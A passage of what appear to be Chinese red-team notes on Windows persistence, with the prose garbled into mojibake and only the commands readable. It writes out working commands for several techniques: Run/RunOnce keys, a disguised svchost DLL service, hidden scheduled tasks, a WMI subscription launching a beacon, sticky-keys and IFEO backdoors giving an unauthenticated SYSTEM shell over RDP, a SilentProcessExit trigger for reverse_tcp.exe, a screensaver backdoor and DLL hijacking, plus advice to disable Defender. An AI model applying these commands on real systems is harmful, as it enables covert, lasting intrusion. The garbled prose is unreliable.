6.RunOnceï¼¼Setupæ³¨å†Œé”® HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼RunOnceï¼¼Setup HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼RunOnceï¼¼Setup 7.RunOnceæ³¨å†Œé”® å®‰è£…ç¨‹åºé€šå¸¸ç”¨RunOnceé”®è‡ªåŠ¨è¿è¡Œç¨‹åºï¼Œå®ƒçš„ä½ç½®åœ¨ HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼RunOnce [å°äºNT6]HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼RunOnceEx HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼RunOnce HKEY_LOCAL_MACHINEä¸‹é¢çš„RunOnceé”®ä¼šåœ¨ç”¨æˆ·ç™»å½•ä¹‹åç«‹å³è¿è¡Œç¨‹åºï¼Œè¿è¡Œæ—¶æœºåœ¨å…¶ä»–Runé”®æŒ‡å®šçš„ç¨‹åºä¹‹å‰ï¼›HKEY_CURRENT_USERä¸‹é¢çš„RunOnceé”®åœ¨æ“ä½œç³»ç»Ÿå¤„ç†å…¶ä»–Runé”®ä»¥åŠâ€œå¯åŠ¨â€æ–‡ä»¶å¤¹çš„å†…å®¹ä¹‹åè¿è¡Œã€‚ 8.Runæ³¨å†Œé”® HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼Run HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼Run Runæ˜¯è‡ªåŠ¨è¿è¡Œç¨‹åºæœ€å¸¸ç”¨çš„æ³¨å†Œé”®ï¼ŒHKEY_CURRENT_USERä¸‹é¢çš„Runé”®ç´§æ¥HKEY_LOCAL_MACHINEä¸‹é¢çš„Runé”®è¿è¡Œï¼Œä½†ä¸¤è€…éƒ½åœ¨å¤„ç†â€œå¯åŠ¨â€æ–‡ä»¶å¤¹ä¹‹å‰ã€‚ å†™å…¥æ³¨å†Œé”®å‘½ä»¤å¦‚ä¸‹ï¼š\nreg add \u0026#34;XXXX\u0026#34; /v evil /t REG_SZ /d \u0026#34;[Absolute Path]\\evil.exe\u0026#34; æœåŠ¡ æƒé™è¦æ±‚ï¼šæœªé™æƒçš„ç®¡ç†å‘˜æƒé™\nåˆ›å»ºæœåŠ¡æ˜¯éœ€è¦éé™æƒç®¡ç†å‘˜æƒé™çš„ï¼Œå› æ­¤æ‹¿åˆ°shellåè¦ç”¨è¿™ç§æ–¹æ³•åšç»´æŒé¦–å…ˆè¦ææƒï¼Œä½†å…¶ä¼˜ç‚¹æ˜¯éšè”½æ€§æ¯”æ³¨å†Œé”®é«˜ï¼ˆå¦‚ç”¨svchostçš„æœåŠ¡ç»„åŠ è½½DLLå°±å¯ä»¥éšè—æ‰æ¶æ„è¿›ç¨‹ï¼‰\ncmdæ‹‰èµ· CMDå’ŒPowershelléƒ½å¯ä»¥ç”¨å‘½ä»¤æ·»åŠ æœåŠ¡ï¼Œæ ·ä¾‹å¦‚ä¸‹ï¼š\nsc create evil binpath= \u0026#34;cmd.exe /k [Absolute Path]evil.exe\u0026#34; start= \u0026#34;auto\u0026#34; obj= \u0026#34;LocalSystem\u0026#34; è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼šshellcodeloaderä¸»çº¿ç¨‹ä¼šé˜»å¡å¯¼è‡´æœåŠ¡å¯åŠ¨æ—¶è®¤ä¸ºç¨‹åºæ— å“åº”è€Œå¤±è´¥ï¼Œå› æ­¤å¿…é¡»ç”¨cmdæ‹‰èµ·æ¥ï¼Œä¸èƒ½ç›´æ¥åˆ›å»ºæœåŠ¡\næœåŠ¡æ­£å¸¸å¯åŠ¨åè¿›ç¨‹ä»¥SYSTEMæƒé™åœ¨ç”¨æˆ·ç™»å½•å‰è¿è¡Œï¼Œä½†ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œæ¶æ„è¿›ç¨‹è¿˜æ˜¯ç‹¬ç«‹å­˜åœ¨çš„ï¼Œä»»åŠ¡ç®¡ç†å™¨å°±èƒ½çœ‹è§ï¼Œéšè”½æ€§è¾ƒå·®\nsvchostå¯åŠ¨ è¿™ç§æ–¹æ³•æ›´åŠ éšè”½ï¼Œç”±äºWindowsç³»ç»Ÿä¸­çš„è®¸å¤šæœåŠ¡éƒ½æ˜¯é€šè¿‡æ³¨å…¥åˆ°è¯¥ç¨‹åºä¸­å¯åŠ¨ï¼ˆè¿™ä¹Ÿæ˜¯å®˜æ–¹è®¤å¯çš„DLLæ³¨å…¥åŠ¨ä½œï¼‰ï¼Œå› æ­¤åªè¦DLLæœ¬èº«å…æ€ï¼Œæ€æ¯’è½¯ä»¶å°±ä¸ä¼šç†ä¼šè¿™ç§è¡Œä¸ºï¼Œå¹¶ä¸”ç”±äºæ¶æ„è¿›ç¨‹å¹¶ä¸æ˜¯ç‹¬ç«‹å­˜åœ¨çš„ï¼Œéšè”½æ€§ç›¸å¯¹è¾ƒé«˜\nä½†è¿™ä¸ªæ–¹æ³•å°±æ²¡åŠæ³•ä¸€è¡Œå‘½ä»¤å®Œæˆï¼Œä¸ä»…éœ€è¦è‡ªå·±åšä¸€ä¸ªæœåŠ¡DLLï¼Œè¿˜éœ€è¦é¢å¤–åœ¨æ³¨å†Œè¡¨ä¸­æ·»åŠ ä¸€äº›ä¸œè¥¿ã€‚ç”±äº64ä½ç³»ç»Ÿæœ‰ä¸¤å¥—æ³¨å†Œè¡¨å’Œä¸¤å¥—svchostï¼Œå› æ­¤å‘½ä»¤è¿˜æœ‰å¾®å°çš„ä¸åŒ\n32ä½ï¼š\nsc create TimeSync binPath= \u0026#34;C:\\Windows\\System32\\svchost.exe -k netsvr\u0026#34; start= auto obj= LocalSystem reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\TimeSync\\Parameters /v ServiceDll /t REG_EXPAND_SZ /d \u0026#34;C:\\Users\\hunter\\Desktop\\localService32.dll\u0026#34; /f /reg:32 reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\TimeSync /v Description /t REG_SZ /d \u0026#34;Windows Time Synchronization Service\u0026#34; /f /reg:32 reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\TimeSync /v DisplayName /t REG_SZ /d \u0026#34;TimeSyncSrv\u0026#34; /f /reg:32 reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\u0026#34; /v netsvr /t REG_MULTI_SZ /d TimeSync /f /reg:32 sc start TimeSync 64ä½ï¼š\nsc create TimeSync binPath= \u0026#34;C:\\Windows\\System32\\svchost.exe -k netsvr\u0026#34; start= auto obj= LocalSystem reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\TimeSync\\Parameters /v ServiceDll /t REG_EXPAND_SZ /d \u0026#34;C:\\Users\\hunter\\Desktop\\localService32.dll\u0026#34; /f /reg:64 reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\TimeSync /v Description /t REG_SZ /d \u0026#34;Windows Time Synchronization Service\u0026#34; /f /reg:64 reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\TimeSync /v DisplayName /t REG_SZ /d \u0026#34;TimeSyncSrv\u0026#34; /f /reg:64 reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\u0026#34; /v netsvr /t REG_MULTI_SZ /d TimeSync /f /reg:64 sc start TimeSync æ³¨æ„ï¼šä½¿ç”¨â€œreg addâ€å‘½ä»¤å‘æ³¨å†Œè¡¨é”®ä¸­æ·»åŠ æ•°æ®çš„æ—¶å€™æ˜¯ç›´æ¥è¦†ç›–çš„ï¼Œè€Œâ€œHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchostâ€ä¸­çš„å¤§å¤šæ•°çš„é”®éƒ½æ˜¯REG_MULTI_SZç±»å‹ï¼Œå³å¤šè¡Œæ•°æ®ã€‚å› æ­¤åƒä¸‡ä¸èƒ½ç›´å‘å·²ç»å­˜åœ¨çš„é”®ä¸­å†™å…¥æ•°æ®ï¼Œç³»ç»Ÿå¯åŠ¨æ‰€éœ€è¦çš„æœåŠ¡éƒ½åœ¨é‡Œé¢ï¼Œè¦†ç›–åä¼šå‡ºå¤§é—®é¢˜ï¼ï¼ˆæ‰€ä»¥ä¸Šé¢å‘½ä»¤ä¸­æ˜¯ç”¨çš„â€œnetsvrâ€ï¼Œè¿™ä¸ªé”®é»˜è®¤æ˜¯ä¸å­˜åœ¨çš„ï¼‰\nè®¡åˆ’ä»»åŠ¡ æƒé™è¦æ±‚ï¼šæœªé™æƒçš„ç®¡ç†å‘˜æƒé™/æ™®é€šç”¨æˆ·\nè®¡åˆ’ä»»åŠ¡ä¹Ÿæ˜¯ä¸€é¡¹å¾ˆå¥½çš„æŒä¹…åŒ–åˆ©ç”¨ç‚¹ã€‚ä¸åŒäºè‡ªå¯æ³¨å†Œé”®å’ŒæœåŠ¡é¡¹ï¼Œè®¡åˆ’ä»»åŠ¡çš„è®¾å®šæ–¹å¼æ›´å¤šæ ·ã€çµæ´»ï¼Œä½ç½®ä¹Ÿç›¸å¯¹è¾ƒä¸ºéšè”½ï¼ˆæ‰‹å·¥æ’æŸ¥è¦å¤šç‚¹å‡ ä¸‹ï¼‰\nWindowsä¸­æœ‰å‘½ä»¤â€œSCHTASKSâ€ç”¨æ¥ç®¡ç†è®¡åˆ’ä»»åŠ¡ï¼Œæ”¯æŒä¸‹é¢å‡ ä¸ªé€‰é¡¹ï¼Œåœ¨æŒä¹…åŒ–è¿‡ç¨‹ä¸­æ¯”è¾ƒå¸¸ç”¨çš„å‘½ä»¤æ˜¯Create\nå½“ç„¶ï¼Œâ€œè®¡åˆ’ä»»åŠ¡ç¨‹åºåº“â€ä¸­ä¹Ÿæ˜¯æœ‰è·¯å¾„çš„ï¼Œæ¯”å¦‚è¿™é‡Œè¿˜èƒ½çœ‹è§æˆ‘ä¹‹å‰æµ‹è¯•çš„smbshellï¼š\nä¸ºäº†ç¡®ä¿éšè”½æ€§ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥éµå®ˆWindowsé»˜è®¤çš„è§„èŒƒåœ¨â€œ\\Microsoft\\Windows\\â€ä¸‹é¢æ–°å»ºæˆ‘ä»¬çš„å­ç›®å½•å’Œè®¡åˆ’ä»»åŠ¡ã€‚ç¤ºä¾‹å‘½ä»¤å¦‚ä¸‹ï¼š\nSCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \\Microsoft\\Windows\\evil\\eviltask /TR C:\\Users\\hunter\\Desktop\\evil.exe è¿™ç§æƒ…å†µæ— éœ€ç”¨æˆ·ç™»å½•å³å¯æ”¶åˆ°åå‘è¿æ¥\nåœ¨è¿›ç¨‹æ ‘ä¸­ï¼Œæ¶æ„è¿›ç¨‹æ˜¯è¢«taskeng.exeå³ä»»åŠ¡è®¡åˆ’ç¨‹åºå¼•æ“æ‹‰èµ·çš„ï¼Œéšè”½æ€§å¼±äºDLLæœåŠ¡ï¼Œä½†å¼ºäºè‡ªå¯æ³¨å†Œé”®\næ³¨æ„ï¼šSCHTASKSå‘½ä»¤åŠŸèƒ½å¹¶ä¸å®Œæ•´ï¼Œå¾ˆå¤šé…ç½®é¡¹æ˜¯æ— æ³•æ“ä½œçš„ï¼Œæ¯”å¦‚ä¸æ”¯æŒåŒæ—¶åˆ›å»ºå¤šä¸ªè§¦å‘å™¨ï¼Œä¸æ”¯æŒä¿®æ”¹â€œæ¡ä»¶â€å’Œâ€œè®¾ç½®â€é€‰é¡¹å¡ä¸­çš„åŠŸèƒ½ï¼Œå¾ˆå¤šé€‰é¡¹éœ€è¦GUIæ¥é…ç½®ï¼š\nå› æ­¤è®¡åˆ’ä»»åŠ¡è¿™ä¸ªæŒä¹…åŒ–çš„è·¯å­åªèƒ½ä½œä¸ºä¸€ä¸ªä¿é™©ï¼Œå¹¶ä¸èƒ½å®Œå…¨ä¾èµ–\nè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç›¸ä¼¼çš„åˆ©ç”¨ç‚¹ï¼šç»„ç­–ç•¥ï¼Œåœ¨å¯åŠ¨è„šæœ¬å¤„å¯ä»¥æ‰§è¡Œcmdè„šæœ¬æˆ–psè„šæœ¬ä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä½†ç”±äºå‘½ä»¤è¡Œç‰ˆæœ¬çš„ç»„ç­–ç•¥ç¼–è¾‘å™¨åŠŸèƒ½å¤ªè¿‡å—é™ï¼Œå°±ä¸å†åšå±•å¼€ï¼ˆå¦‚æœå¯ä»¥ç™»å½•æ¡Œé¢çš„è¯ç›´æ¥å»gpedit.mscå»é…ç½®å¯åŠ¨è„šæœ¬å³å¯æŒä¹…åŒ–ï¼Œä¸”éšè”½æ€§è¾ƒé«˜ï¼‰\näº‹ä»¶è§¦å‘æ‰§è¡Œ WMI æƒé™è¦æ±‚ï¼šæœªé™æƒçš„ç®¡ç†å‘˜æƒé™ã€‚ æˆ‘ä»¬å¯ä»¥è®¤ä¸ºWMIæ˜¯ä¸€ç»„å¯ä»¥ç›´æ¥ä¸Windowsæ“ä½œç³»ç»Ÿäº¤äº’çš„APIï¼Œç”±äºè¿™æ˜¯æ“ä½œç³»ç»Ÿè‡ªå¸¦çš„å·¥å…·ï¼Œæ— éœ€å®‰è£…ï¼Œå› æ­¤ä¹Ÿæ˜¯æƒé™ç»´æŒçš„å¥½å¸®æ‰‹ã€‚ ç”±äºWMIçš„äº‹ä»¶ä¼šå¾ªç¯æ‰§è¡Œï¼Œä¸ºç¡®ä¿ä¸ä¼šæ— é™å¼¹shellï¼Œå¯ä»¥ä½¿ç”¨ç³»ç»Ÿå¯åŠ¨æ—¶é—´æ¥é™åˆ¶ï¼ˆåªè¦è§¦å‘å»¶æ—¶å¯ä»¥è½åœ¨é™å®šåŒºé—´å³å¯ï¼Œæœ‰äº›æœºå™¨å¯åŠ¨æ…¢å› æ­¤èµ·å§‹æ—¶é—´è°ƒé«˜äº›ï¼‰ã€‚ç¤ºä¾‹å‘½ä»¤å¦‚ä¸‹ï¼š\nwmic /NAMESPACE:\u0026#34;\\\\root\\subscription\u0026#34; PATH __EventFilter CREATE Name=\u0026#34;evil\u0026#34;, EventNameSpace=\u0026#34;root\\cimv2\u0026#34;,QueryLanguage=\u0026#34;WQL\u0026#34;, Query=\u0026#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \u0026#39;Win32_PerfFormattedData_PerfOS_System\u0026#39; AND TargetInstance.SystemUpTime \u0026gt;= 240 AND TargetInstance.SystemUpTime \u0026lt; 310\u0026#34; wmic /NAMESPACE:\u0026#34;\\\\root\\subscription\u0026#34; PATH CommandLineEventConsumer CREATE Name=\u0026#34;evilConsumer\u0026#34;, ExecutablePath=\u0026#34;C:\\Users\\hunter\\Desktop\\beacon.exe\u0026#34;,CommandLineTemplate=\u0026#34;C:\\Users\\hunter\\Desktop\\beacon.exe\u0026#34; wmic /NAMESPACE:\u0026#34;\\\\root\\subscription\u0026#34; PATH __FilterToConsumerBinding CREATE Filter=\u0026#34;__EventFilter.Name=\\\u0026#34;evil\\\u0026#34;\u0026#34;, Consumer=\u0026#34;CommandLineEventConsumer.Name=\\\u0026#34;evilConsumer\\\u0026#34;\u0026#34; ç”±äºæ—¶é—´åŒºé—´çš„è½ç‚¹ä¸ä¸€å®šç›¸åŒï¼Œç‰¹å®šæƒ…å†µä¸‹æœ‰å¯èƒ½ä¼šå‡ºç°å¤šä¸ªbeaconï¼Œä¸”åœ¨è¿›ç¨‹æ ‘ä¸­çš„éšè”½æ€§ä¸€èˆ¬\nå½“ç„¶ï¼Œå¸‚é¢ä¸Šæœ‰å¾ˆå¤šè‡ªåŠ¨åŒ–å·¥å…·ï¼Œè¿™é‡Œå°±ä¸å¤šè®°å½•äº†\nåˆ©ç”¨ç³»ç»Ÿè¾…åŠ©åŠŸèƒ½ æƒé™è¦æ±‚ï¼šéœ€è¦æå‡è‡³administrator/trustedinstaller\nä¸ºäº†ä½¿ç”µè„‘æ›´æ˜“äºä½¿ç”¨å’Œè®¿é—®ï¼ŒWindows æ·»åŠ äº†ä¸€äº›è¾…åŠ©åŠŸèƒ½ã€‚è¿™äº›åŠŸèƒ½å¯ä»¥åœ¨ç”¨æˆ·ç™»å½•ä¹‹å‰ä»¥ç»„åˆé”®å¯åŠ¨ã€‚æ ¹æ®è¿™ä¸ªç‰¹å¾ï¼Œä¸€äº›æ¶æ„è½¯ä»¶æ— éœ€ç™»å½•åˆ°ç³»ç»Ÿï¼Œé€šè¿‡è¿œç¨‹æ¡Œé¢åè®®å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç \næ¯”å¦‚æœ€å¸¸è§çš„æŒ‰5ä¸‹shiftå‡ºç°çš„ç²˜æ»é”®Sethc.exeï¼Œè¿˜æœ‰Windows + Uç»„åˆé”®æ—¶å¯åŠ¨çš„utilman.exeç¨‹åº\nä»–ä»¬éƒ½å­˜åœ¨äºC:\\Windows\\System32\\ä¸­ï¼š\nå±å¹•é”®ç›˜ï¼š C:\\Windows\\System32\\osk.exe æ”¾å¤§é•œï¼š C:\\Windows\\System32\\Magnify.exe æ—ç™½ï¼š C:\\Windows\\System32\\Narrator.exe æ˜¾ç¤ºåˆ‡æ¢å™¨ C:\\Windows\\System32\\DisplaySwitch.exe åº”ç”¨åˆ‡æ¢å™¨ï¼š C:\\Windows\\System32\\AtBroker.exe åœ¨è¾ƒæ—©çš„ Windows ç‰ˆæœ¬ï¼Œåªéœ€è¦è¿›è¡Œç®€å•çš„äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢ï¼Œæ¯”å¦‚ç»å…¸çš„shiftåé—¨æ˜¯å°†C:\\Windows\\System32\\sethc.exeæ›¿æ¢ä¸ºcmd.exe\nä½†é«˜ç‰ˆæœ¬çš„windowså¯¹C:\\Windows\\System32\\ä¸‹çš„æ–‡ä»¶è¿›è¡Œäº†ä¿æŠ¤ï¼Œéœ€è¦trustedinstalleræƒé™æ‰èƒ½å¯¹å…¶ä¿®æ”¹å’Œå†™å…¥ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡ä»¤ç‰Œçªƒå–å®ç°ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥è¿›è¡Œæ›¿æ¢ï¼š\ncd C:\\Windows\\System32\\ move Sethc.exe Sethc.exe.bak copy cmd.exe Sethc.exe é‚£ä¹ˆå½“æˆ‘ä»¬RDPè¿æ¥ç›®æ ‡æœºæ—¶ï¼Œå³ä½¿æ²¡æœ‰ç™»å½•ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æŒ‰5ä¸‹shiftï¼Œä½¿å…¶å¼¹å‡ºcmdçª—å£(å¹¶ä¸”ä¸ºsystemæƒé™)ï¼Œå®ç°æœªæˆæƒè®¿é—®\nè€Œè¿™é‡Œæ—¢ç„¶å¯ä»¥è·å–systemæƒé™çš„cmdï¼Œå°±å½“ç„¶å¯ä»¥å°è¯•é€šè¿‡RDPåŠ«æŒï¼ˆåœ¨æ¨ªå‘ç§»åŠ¨çš„ç¬”è®°ä¸­ï¼‰ç»•è¿‡ç™»å½•è¿›å…¥æ¡Œé¢äº†\nIFEOæ³¨å…¥ æƒé™è¦æ±‚ï¼šéœ€è¦æå‡è‡³administrator\nä¸Šé¢æåˆ°ä¿®æ”¹C:\\Windows\\System32\\ç›®å½•éœ€è¦trustedinstalleræƒé™ï¼Œé‚£ä¹ˆå¦‚æœä»¤ç‰Œçªƒå–å¤±è´¥äº†ï¼Œè¿˜æœ‰åŠæ³•åˆ©ç”¨è¾…åŠ©åŠŸèƒ½å—ï¼Ÿç­”æ¡ˆå°±æ˜¯IFEOæ³¨å…¥\ndebugger å½“æˆ‘ä»¬åŒå‡»è¿è¡Œç¨‹åºæ—¶ï¼Œç³»ç»Ÿä¼šæŸ¥è¯¢è¯¥IFEOæ³¨å†Œè¡¨ï¼Œå¦‚æœå‘ç°å­˜åœ¨å’Œè¯¥ç¨‹åºåç§°å®Œå…¨ç›¸åŒçš„å­é”®ï¼Œå°±æŸ¥è¯¢å¯¹åº”å­å¥ä¸­åŒ…å«çš„â€œdebuggerâ€é”®å€¼åï¼Œå¦‚æœè¯¥å‚æ•°ä¸ä¸ºç©ºï¼Œç³»ç»Ÿåˆ™ä¼šæŠŠ Debugger å‚æ•°é‡ŒæŒ‡å®šçš„ç¨‹åºæ–‡ä»¶åä½œä¸ºç”¨æˆ·è¯•å›¾å¯åŠ¨çš„ç¨‹åºæ‰§è¡Œè¯·æ±‚æ¥å¤„ç†ã€‚è¿™æ ·æˆåŠŸæ‰§è¡Œçš„æ˜¯é­åˆ°â€œåŠ«æŒâ€çš„è™šå‡ç¨‹åº\nå‘½ä»¤å¦‚ä¸‹ï¼Œè¿™é‡Œå°†dubuggerè®¾ç½®ä¸ºè¦æ‰§è¡Œçš„ç¨‹åºå³å¯ï¼Œæˆ‘è¿™é‡Œä»¥cmdä¸ºä¾‹ï¼š\nreg add \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;c:\\windows\\system32\\cmd.exe\u0026#34; /f å½“ç„¶ï¼Œè®°å¾—å…³defenderï¼š\nè¿™æ ·åŒæ ·å¯ä»¥åœ¨RDPçš„æ—¶å€™ï¼Œç”¨æœªç™»å½•çŠ¶æ€å¼€å¯systemæƒé™çš„cmdï¼š\nglobalflag IFEOè¿˜å¯ä»¥åœ¨æŒ‡å®šç¨‹åºé™é»˜é€€å‡ºæ—¶å¯åŠ¨ä»»æ„ç›‘æ§ç¨‹åºï¼Œä½†éœ€è¦è®¾ç½®3ä¸ªæ³¨å†Œè¡¨ï¼š\n# å¯åŠ¨å¯¹è®°äº‹æœ¬è¿›ç¨‹çš„é™é»˜é€€å‡ºç›‘è§† reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\u0026#34; /v GlobalFlag /t REG_DWORD /d 512 # å¯åŠ¨Windowsé”™è¯¯æŠ¥å‘Šè¿›ç¨‹WerFault.exeï¼Œå°†æˆä¸ºreverse_tcp.exeçš„çˆ¶è¿›ç¨‹ reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\u0026#34; /v ReportingMode /t REG_DWORD /d 1 # å°†ç›‘è§†å™¨è¿›ç¨‹è®¾ä¸ºreverse_tcp.exe reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\u0026#34; /v MonitorProcess /d \u0026#34;C:\\Windows\\System32\\reverse_tcp.exe\u0026#34; å½“ç”¨æˆ·æ‰“å¼€è®°äº‹æœ¬ï¼ˆnotepad.exeï¼‰æ—¶ï¼Œç¨‹åºæ­£å¸¸å¯åŠ¨ã€‚å½“ç”¨æˆ·å…³é—­è®°äº‹æœ¬æˆ–ç›¸å…³è¿›ç¨‹è¢«æ€æ­»åï¼Œå°†åœ¨WerFaultè¿›ç¨‹ä¸­åˆ›å»ºå­è¿›ç¨‹ä»¥è¿è¡Œåé—¨ç¨‹åºreverse_tcp.exe\nå±å¹•ä¿æŠ¤ç¨‹åº æƒé™è¦æ±‚ï¼šæ™®é€šç”¨æˆ·\nè™½ç„¶æœªå¿…æ‰€æœ‰ç”¨æˆ·éƒ½ä¼šä½¿ç”¨å±å¹•ä¿æŠ¤ï¼Œä½†å¹¸è¿çš„æ˜¯å±å¹•ä¿æŠ¤ç¨‹åºçš„ç›¸å…³é…ç½®éƒ½åœ¨æ³¨å†Œè¡¨ä¸­ï¼Œå¦‚ä¸‹å›¾çš„å››ä¸ªé”®ï¼š\nHKEY_CURRENT_USER\\Control Panel\\Desktop\\ScreenSaveActive HKEY_CURRENT_USER\\Control Panel\\Desktop\\ScreenSaverIsSecure HKEY_CURRENT_USER\\Control Panel\\Desktop\\ScreenSaveTimeOut HKEY_CURRENT_USER\\Control Panel\\Desktop\\SCRNSAVE.EXE æ‰€ä»¥ç›´æ¥å¼€å¯ï¼š\n# å°†è§¦å‘å±å¹•ä¿æŠ¤æ—¶æ‰§è¡Œçš„ç¨‹åºè®¾ä¸ºè‡ªå®šä¹‰çš„æ¶æ„ç¨‹åºï¼Œè¿™é‡Œçš„ç¨‹åºä»¥.scræˆ–.exeå‡å¯ reg add \u0026#34;HKEY_CURRENT_USER\\Control Panel\\Desktop\u0026#34; /v SCRNSAVE.EXE /t REG_SZ /d \u0026#34;C:\\Users\\Yuy0ung\\desktop\\artifact.exe\u0026#34; /f # å¯ç”¨å±å¹•ä¿æŠ¤ reg add \u0026#34;HKEY_CURRENT_USER\\Control Panel\\Desktop\u0026#34; /v ScreenSaveActive /t REG_SZ /d \u0026#34;1\u0026#34; /f # è®¾ç½®ä¸éœ€è¦å¯†ç è§£é” reg add \u0026#34;HKEY_CURRENT_USER\\Control Panel\\Desktop\u0026#34; /v ScreenSaverIsSecure /t REG_SZ /d \u0026#34;0\u0026#34; /f # å°†ç”¨æˆ·ä¸æ´»åŠ¨çš„è¶…æ—¶è®¾ä¸º60ç§’ reg add \u0026#34;HKEY_CURRENT_USER\\Control Panel\\Desktop\u0026#34; /v ScreenSaveTimeOut /t REG_SZ /d \u0026#34;60\u0026#34; /f ä¸€æ®µæ—¶é—´åï¼Œå±ä¿ä¼šå¼€å¯ï¼Œè§¦å‘åé—¨ï¼Œå®ç°æƒé™ç»´æŒ\nDLLåŠ«æŒ æƒé™è¦æ±‚ï¼šææƒè‡³administrator\nå’Œæˆ‘ä¹‹å‰æ–‡ç« ä¸­linuxçš„soå…±äº«åº“åŠ«æŒæ˜¯åŒæ ·çš„åŸç†\nDLLåŠ«æŒæ¼æ´ä¹‹æ‰€ä»¥è¢«ç§°ä¸ºæ¼æ´ï¼Œè¿˜è¦ä»è´Ÿè´£åŠ è½½DLLçš„ç³»ç»ŸAPI LoadLibrary æ¥çœ‹ã€‚å› ä¸ºè°ƒâ½¤ LoadLibrary æ—¶å¯ä»¥ä½¿â½¤DLLçš„ç›¸å¯¹è·¯å¾„ï¼Œè¿™æ—¶ï¼Œç³»ç»Ÿä¼šæŒ‰ç…§ç‰¹å®šçš„é¡ºåºæœç´¢â¼€ äº›â½¬å½•ï¼Œä»¥ç¡®å®šDLLçš„å®Œæ•´è·¯å¾„ã€‚æ ¹æ®MSDNâ½‚æ¡£çš„çº¦å®šï¼Œåœ¨ä½¿â½¤ç›¸å¯¹è·¯å¾„è°ƒâ½¤ LoadLibrary ï¼ˆåŒæ ·é€‚ â½¤äºå…¶ä»–åŒç±»DLL LoadLibraryExï¼ŒShellExecuteExç­‰ï¼‰æ—¶ï¼Œç³»ç»Ÿä¼šä¾æ¬¡ä»ä»¥ä¸‹6ä¸ªä½ç½®å»æŸ¥æ‰¾æ‰€éœ€è¦çš„ DLLâ½‚ä»¶ï¼ˆä¼šæ ¹æ®SafeDllSearchModeé…ç½®â½½ç¨æœ‰ä¸åŒï¼‰ã€‚\nç¨‹åºæ‰€åœ¨â½¬å½• åŠ è½½ DLL æ—¶æ‰€åœ¨çš„å½“å‰â½¬å½• ç³»ç»Ÿâ½¬å½•å³ SYSTEM32 â½¬å½• 16ä½ç³»ç»Ÿâ½¬å½•å³ SYSTEM â½¬å½• Windowsâ½¬å½• PATHç¯å¢ƒå˜é‡ä¸­åˆ—å‡ºçš„â½¬å½• dllåŠ«æŒå°±å‘â½£åœ¨ç³»ç»ŸæŒ‰ç…§é¡ºåºæœç´¢è¿™äº›ç‰¹å®šâ½¬å½•æ—¶ã€‚åªè¦â¿Šå®¢èƒ½å¤Ÿå°†æ¶æ„çš„DLLæ”¾åœ¨ä¼˜å…ˆäºæ­£å¸¸DLLæ‰€åœ¨çš„â½¬å½•ï¼Œå°±èƒ½å¤Ÿæ¬ºéª—ç³»ç»Ÿä¼˜å…ˆåŠ è½½æ¶æ„DLLï¼Œæ¥å®ç°â€œåŠ«æŒâ€\nåœ¨win7åŠwin7ä»¥ä¸Šç³»ç»Ÿå¢åŠ äº†KnownDLLsä¿æŠ¤ï¼Œéœ€è¦åœ¨å¦‚ä¸‹æ³¨å†Œè¡¨ä¸‹æ·»åŠ dllæ‰èƒ½é¡ºåˆ©åŠ«æŒï¼š\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\ExcludeFromKnownDlls åŸŸåé—¨ å†…å®¹æ”¾åœ¨æˆ‘çš„åŸŸæ¸—é€æ–‡ç« ä¸­\n",
